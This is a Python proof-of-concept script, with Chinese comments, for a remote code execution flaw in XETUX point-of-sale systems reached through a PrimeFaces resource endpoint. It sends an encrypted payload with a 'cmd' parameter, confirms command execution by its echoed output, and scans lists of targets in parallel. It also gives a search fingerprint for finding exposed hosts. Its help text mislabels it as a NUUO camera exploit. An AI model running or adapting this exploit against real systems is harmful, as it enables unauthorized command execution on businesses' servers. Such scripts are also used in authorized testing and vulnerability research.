"""
链接：https://mp.weixin.qq.com/s/I-3t2xcHSIT6VpEvHsrFlQ
介绍：XETUX 系统 dynamiccontent.properties.xhtml 远程代码执行漏洞
指纹：title="@XETUX" && title="XPOS" && body = "BackEnd"
"""
import argparse
import textwrap
from multiprocessing.dummy import Pool

import requests


def check(target, timeout=5):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/94.0.4606.81 Safari/537.36',
            'Accept': '*/*',
            'Connection': 'close',
        }
        url = target + '/xc-one-pos/javax.faces.resource/dynamiccontent.properties.xhtml'

        data = {
            'pfdrt': 'sc',
            'ln': 'primefaces',
            'pfdrid': '4xE5s8AClZxUxmyaZjpBstMXUalIgOJHOtvxel/v4YXvibdOn52ow4M6lDaKd9Gb8JdQqbACZNWVZpVS+3sX1Hoizouty1mYYT4yJsKPnUZ0LUHDvN0GB5YLgX1PkNY+1ZQ/nOSg5J1LDyzAjBheAxLDODIVcHkmJ6hnJsQ0YQ8bMU5++TqeD4BGqCZMDjP+ZQvveiUhxsUC/+tPqnOgFSBV8TBjDSPNmVoQ9YcKTGelKuJjS2kCXHjcyz7PcQksSW6UUmKu9RhJ+x3Mnx6j56eroVPWnM2vdYRt5An6cLo1YPXu9uqriyg1wgm/7xYP/UwP1q8wfVeyM4fOw2xJzP6i1q4VLHLXi0VYHAIgaPrZ8gH8XH4X2Kq6ewyrJ62QxBF5dtE3tvLAL5tpGxqek5VW+hZFe9ePu0n5tLxWmqgqni8bKGbGrGu4IhXhCJhBxyelLQzPGLCfqmiQwYX5Ime9EHj1k5eoWQzH8jb3kQfFJ0exVprGCfXKGfHyfKfLEOd86anNsiQeNavNL7cDKV0yMbz52n6WLQrCAyzulE8kBCZPNGIUJh24npbeaHTaCjHRDtI7aIPHAIhuMWn7Ef5TU9DcXjdJvZqrItJoCDrtxMFfDhb0hpNQ2ise+bYIYzUDkUtdRV+jCGNI9kbPG5QPhAqp/JBhQ+XsqIhsu4LfkGbt51STsbVQZvoNaNyukOBL5IDTfNY6wS5bPSOKGuFjsQq0Xoadx1t3fc1YA9pm/EWgyR5DdKtmmxG93QqNhZf2RlPRJ5Z3jQAtdxw+xBgj6mLY2bEJUZn4R75UWnvLO6JM918jHdfPZELAxOCrzk5MNuoNxsWreDM7e2GX2iTUpfzNILoGaBY5wDnRw46ATxhx6Q/Eba5MU7vNX1VtGFfHd2cDM5cpSGOlmOMl8qzxYk1R+A2eBUMEl8tFa55uwr19mW9VvWatD8orEb1RmByeIFyUeq6xLszczsB5Sy85Y1KPNvjmbTKu0LryGUc3U8VQ7AudToBsIo9ofMUJAwELNASNfLV0fZvUWi0GjoonpBq5jqSrRHuERB1+DW2kR6XmnuDdZMt9xdd1BGi1AM3As0KwSetNq6Ezm2fnjpW877buqsB+czxMtn6Yt6l88NRYaMHrwuY7s4IMNEBEazc0IBUNF30PH+3eIqRZdkimo980HBzVW4SXHnCMST65/TaIcy6/OXQqNjpMh7DDEQIvDjnMYMyBILCOCSDS4T3JQzgc+VhgT97imje/KWibF70yMQesNzOCEkaZbKoHz498sqKIDRIHiVEhTZlwdP29sUwt1uqNEV/35yQ+O8DLt0b+jqBECHJzI1IhGvSUWJW37TAgUEnJWpjI9R1hT88614GsVDG0UYv0u8YyS0chh0RryV3BXotoSkSkVGShIT4h0s51Qjswp0luewLtNuVyC5FvHvWiHLzbAArNnmM7k/GdCn3jLe9PeJp7yqDzzBBMN9kymtJdlm7c5XnlOv+P7wIJbP0i4+QF+PXw5ePKwSwQ9v8rTQ==',
            'cmd': 'echo 123123qwe',
        }

        # 抑制 InsecureRequestWarning 警告
        # requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

        response = requests.post(url, headers=headers, verify=False, timeout=timeout, data=data)
        if response.status_code == 200 and '123123qwe' in response.text:
            print('[*]存在漏洞' + url)
        else:
            print('[-]不存在漏洞' + url)
    except TimeoutError:
        print(f"请求超时{target}")
    except Exception as e:
        print(f"连接失败{target}-无法建立连接")




def main():
    banner = """
              ) (`-.        ('-.   .-') _             ) (`-.                _ (`-.                               
         ( OO ).    _(  OO) (  OO) )             ( OO ).             ( (OO  )                              
        (_/.  \_)-.(,------./     '._ ,--. ,--. (_/.  \_)-.         _.`     \ .-'),-----.    .-----.       
         \  `.'  /  |  .---'|'--...__)|  | |  |  \  `.'  /         (__...--''( OO'  .-.  '  '  .--./       
          \     /\  |  |    '--.  .--'|  | | .-') \     /\          |  /  | |/   |  | |  |  |  |('-.       
           \   \ | (|  '--.    |  |   |  |_|( OO ) \   \ |   (`-.   |  |_.' |\_) |  |\|  | /_) |OO  )      
          .'    \_) |  .--'    |  |   |  | | `-' /.'    \_) (OO  )_ |  .___.'  \ |  | |  | ||  |`-'|       
         /  .'.  \  |  `---.   |  |  ('  '-'(_.-'/  .'.  \ ,------.)|  |        `'  '-'  '(_'  '--'\       
        '--'   '--' `------'   `--'    `-----'  '--'   '--'`------' `--'          `-----'    `-----'   

        """
    print(banner)
    parse = argparse.ArgumentParser(description="NUUO摄像头命令执行漏洞",
                                    epilog=textwrap.dedent('''example:
    python3 XETUX_POC.py -u http://xxxx.xxxx.xxxx.xxxx
    python3 XETUX_POC -f x_url.txt '''))
    parse.add_argument('-u', '--url', dest='url', type=str, help='添加url信息')
    parse.add_argument('-f', '--file', dest='file', type=str, help='添加txt文件')

    args = parse.parse_args()
    targets = []
    pool = Pool(30)
    try:
        if args.url:
            check(args.url)
        else:
            f = open(args.file, 'r+')
            for target in f.readlines():
                target = target.strip()
                if 'http' in target:
                    targets.append(target)
                else:
                    url = f"http://{target}"
                    targets.append(url)
            pool.map(check, targets)
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()
